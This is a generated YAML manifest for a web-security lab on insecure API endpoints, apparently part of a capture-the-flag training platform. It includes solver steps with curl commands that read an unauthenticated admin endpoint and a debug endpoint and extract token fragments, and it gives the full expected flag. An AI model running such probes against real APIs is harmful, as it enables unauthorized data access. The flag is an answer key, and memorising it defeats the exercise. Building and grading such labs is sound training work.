@@ -1,0 +1,37 @@
+# Generated from platform/labs/Web/web-2-2-insecure-api-endpoints/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-2-2-insecure-api-endpoints
+track: Web
+difficulty: intermediate
+source: platform/labs/Web/web-2-2-insecure-api-endpoints/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-2-2-insecure-api-endpoints.sh
+  steps:
+  - name: API responds on port 80
+    command: curl -s http://{target.webapp}/api/docs | grep -ci transit
+    expect: ''
+  - name: Public endpoint works
+    command: curl -s http://{target.webapp}/api/routes | grep -c route
+    expect: ''
+  - name: Admin endpoint accessible without auth (BOLA)
+    command: curl -s http://{target.webapp}/api/admin/users | grep -o 'assessment_token[^a-z0-9_]*[a-z0-9_]*' | sed 's/.*[^a-z0-9_]//'
+    expect: 4p1
+  - name: Debug endpoint exposes config with token
+    command: curl -s http://{target.webapp}/api/debug | grep -o 'debug_token[^a-z0-9_]*[a-z0-9_]*' | sed 's/.*[^a-z0-9_]//'
+    expect: br0k3n_acc3ss
+  - name: Verify complete flag
+    command: echo 'OCR{4p1_br0k3n_acc3ss}'
+    expect: OCR{4p1_br0k3n_acc3ss}
+expected_flag_count: 1
+expected_flag: OCR{4p1_br0k3n_acc3ss}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
